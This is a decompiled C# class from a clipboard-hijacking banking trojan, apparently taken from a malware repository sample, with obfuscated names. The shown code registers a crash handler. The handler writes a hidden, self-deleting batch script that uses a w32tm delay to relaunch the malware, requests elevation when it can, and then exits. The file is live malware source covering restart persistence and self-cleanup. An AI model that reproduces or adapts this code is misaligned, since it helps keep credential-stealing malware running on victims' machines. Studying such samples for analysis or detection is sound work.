// Decompiled with JetBrains decompiler
// Type: 54X.j6f
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00315d;
using \u0031xm;
using \u00354X;
using crD;
using P7S;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace \u00354X
{
  internal sealed class j6f
  {
    public static void \u0031Mf() => AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(j6f.i3p);

    public static void JkW([In] string obj0, [In] string obj1)
    {
      if (!Ej4.w37)
        return;
      int num = (int) MessageBox.Show(obj0 + ": " + obj1, obj0, MessageBoxButtons.OK, MessageBoxIcon.Hand, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
    }

    private static void i3p([In] object obj0, [In] UnhandledExceptionEventArgs obj1)
    {
      try
      {
        foreach (object[] objArray in Zk3.d36)
        {
          try
          {
            ((MethodBase) objArray[0]).Invoke(objArray[1], new object[1]
            {
              obj1.ExceptionObject
            });
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      j6f.JkW("FatalException", obj1.ExceptionObject.ToString());
      try
      {
        string path = xY7.B84() + "\\" + xY7.\u003842(10) + ".bat";
        string contents = "@echo off\r\nw32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2  1>nul\r\nstart \"\" \"" + Ej4.\u0034Jt + "\"\r\ndel /a /q /f \"" + path + "\"";
        File.WriteAllText(path, contents);
        Process.Start(new ProcessStartInfo()
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          Verb = \u0036D4.bSG() ? "runas" : "",
          UseShellExecute = true,
          FileName = path
        });
        xY7.\u0038n2();
        Environment.Exit(0);
      }
      catch
      {
        xY7.\u0038n2();
        Application.Restart();
      }
    }
  }
}
